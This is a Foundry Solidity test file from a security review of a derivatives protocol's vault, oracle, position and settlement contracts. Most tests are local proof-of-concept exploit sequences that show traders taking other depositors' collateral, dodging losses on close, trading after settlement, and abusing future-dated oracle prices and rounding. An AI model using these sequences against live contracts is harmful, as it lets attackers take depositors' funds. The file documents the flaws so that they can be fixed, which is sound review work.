// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {CollateralVault} from "../src/CollateralVault.sol";
import {IndexOracleConsumer} from "../src/IndexOracleConsumer.sol";
import {PositionManager} from "../src/PositionManager.sol";
import {SettlementEngine} from "../src/SettlementEngine.sol";
import {MockUSDC} from "../src/MockUSDC.sol";

/// @notice Local-only evidence of current vulnerabilities, NOT safety regressions.
///         These tests assert the unsafe current behavior. Replace the assertions
///         with rejection/conservation assertions when the reviewed design is fixed.
contract SecurityReviewTest is Test {
    CollateralVault vault;
    IndexOracleConsumer oracle;
    PositionManager pm;
    SettlementEngine settlement;
    MockUSDC usdc;

    address owner = makeAddr("review-owner");
    address trader = makeAddr("review-trader");
    address depositor = makeAddr("review-depositor");
    uint256 constant SIGNER_KEY = 0xABCD; // Synthetic local test key only.
    bytes32 constant BASKET = keccak256("security-review-local-only");
    uint256 constant USD = 1e6;

    function setUp() public {
        usdc = new MockUSDC("Local test USDC", "USDC");
        vault = new CollateralVault(address(usdc), owner);
        oracle = new IndexOracleConsumer(owner, vm.addr(SIGNER_KEY), 100, 60);
        pm = new PositionManager(owner, address(vault), address(oracle), 5, 60, 125, 50);
        settlement = new SettlementEngine(owner, address(pm), vm.addr(SIGNER_KEY), 100, 60);
        vm.startPrank(owner);
        vault.setPositionManager(address(pm));
        pm.setSettlementEngine(address(settlement));
        vm.stopPrank();
        _deposit(trader, 10 * USD);
        _deposit(depositor, 90 * USD);
        vm.warp(1_000);
        _pushPrice(50, 1_000);
    }

    function _deposit(address user, uint256 amount) internal {
        usdc.mint(user, amount);
        vm.startPrank(user);
        usdc.approve(address(vault), amount);
        vault.deposit(amount);
        vm.stopPrank();
    }

    function _signature(string memory domainName, address target, bytes32 structHash)
        internal
        view
        returns (bytes memory)
    {
        bytes32 domain = keccak256(
            abi.encode(
                keccak256(
                    "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
                ),
                keccak256(bytes(domainName)),
                keccak256("1"),
                block.chainid,
                target
            )
        );
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(SIGNER_KEY, keccak256(abi.encodePacked("\x19\x01", domain, structHash)));
        return abi.encodePacked(r, s, v);
    }

    function _pushPrice(uint256 price, uint256 timestamp) internal {
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("PriceUpdate(bytes32 basketId,uint256 price,uint256 timestamp)"),
                BASKET,
                price,
                timestamp
            )
        );
        oracle.pushPrice(
            BASKET, price, timestamp, _signature("Xleuth Index Oracle", address(oracle), structHash)
        );
    }

    function _settle(uint256 price) internal {
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("SettleBasket(bytes32 basketId,uint256 realizedPrice,uint256 timestamp)"),
                BASKET,
                price,
                block.timestamp
            )
        );
        settlement.settleBasket(
            BASKET,
            price,
            block.timestamp,
            _signature("Xleuth Settlement", address(settlement), structHash)
        );
    }

    function test_Evidence_UnpairedProfitCanConsumeAnotherDepositorsCollateral() public {
        vm.prank(trader);
        pm.openPosition(BASKET, PositionManager.Side.Long, USD, 5);
        assertEq(pm.getOpenUserCount(BASKET), 1, "no matched short exists");

        vm.warp(1_001);
        _pushPrice(60, 1_001);
        vm.startPrank(trader);
        pm.updatePosition(BASKET, PositionManager.Side.Short, USD, 5);
        vault.withdraw(20 * USD);
        vm.stopPrank();

        assertEq(usdc.balanceOf(trader), 20 * USD, "unpaired trader withdrew a profit");
        assertEq(vault.freeBalance(depositor), 90 * USD);
        assertEq(vault.totalCollateral(), 80 * USD, "remaining depositor is undercollateralized");
    }

    function test_Evidence_ClosePositionDiscardsLoss() public {
        vm.prank(trader);
        pm.openPosition(BASKET, PositionManager.Side.Long, USD, 5);
        vm.warp(1_001);
        _pushPrice(41, 1_001);
        assertEq(pm.equityOf(trader, BASKET), USD, "only one USDC of equity remains");

        vm.prank(trader);
        pm.closePosition(BASKET);
        assertEq(vault.freeBalance(trader), 10 * USD, "all ten USDC returned despite loss");
    }

    function test_Evidence_NewPositionCanOpenAfterBasketSettled() public {
        vm.prank(owner);
        settlement.setBasketExpiry(BASKET, block.timestamp);
        _settle(50);
        assertTrue(settlement.isSettled(BASKET));

        vm.prank(trader);
        pm.openPosition(BASKET, PositionManager.Side.Long, USD, 5);
        assertEq(pm.getPosition(trader, BASKET).size, USD);
    }

    function test_Evidence_ZeroRealizedFractionCannotSettle() public {
        vm.prank(owner);
        settlement.setBasketExpiry(BASKET, block.timestamp);
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("SettleBasket(bytes32 basketId,uint256 realizedPrice,uint256 timestamp)"),
                BASKET,
                uint256(0),
                block.timestamp
            )
        );
        bytes memory signature = _signature("Xleuth Settlement", address(settlement), structHash);
        vm.expectRevert(SettlementEngine.InvalidFraction.selector);
        settlement.settleBasket(BASKET, 0, block.timestamp, signature);
    }

    function test_Evidence_FutureOracleTimestampPassesFreshnessCheck() public {
        _pushPrice(50, block.timestamp + 365 days);
        vm.warp(block.timestamp + 1 days);
        vm.prank(trader);
        pm.openPosition(BASKET, PositionManager.Side.Long, USD, 5);
        assertEq(pm.getPosition(trader, BASKET).size, USD);
    }

    function test_Evidence_EntryPriceRoundingDiscardsRealizedLoss() public {
        vm.prank(trader);
        pm.openPosition(BASKET, PositionManager.Side.Long, 100_000, 5);
        vm.warp(1_001);
        _pushPrice(51, 1_001);
        vm.prank(trader);
        pm.updatePosition(BASKET, PositionManager.Side.Long, 100_000, 5);
        assertEq(pm.getPosition(trader, BASKET).entryPrice, 50, "true average 50.5 was truncated");

        vm.warp(1_002);
        _pushPrice(50, 1_002);
        vm.prank(trader);
        pm.updatePosition(BASKET, PositionManager.Side.Short, 200_000, 5);
        assertEq(vault.freeBalance(trader), 10 * USD, "second leg's 0.1 USDC loss disappeared");
    }
}
